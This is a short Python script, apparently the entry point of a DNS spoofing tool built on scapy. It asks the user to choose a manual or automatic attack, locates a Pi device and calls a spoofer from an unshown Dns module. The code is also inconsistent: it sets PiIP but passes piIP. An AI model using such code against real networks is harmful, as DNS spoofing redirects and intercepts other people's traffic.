from scapy.all import *
from dns import Dns
from discovery import Discovery

disco = Discovery()

input = input("Choose your preferred attack\n1. Manual attack\n2. Configure automatic attack\n")
print(input)

PiIP = disco.getPi()
resultIP = "123.45.67.89" # To be set by user

dns = Dns(piIP, resultIP)
dns.spoofer(0)
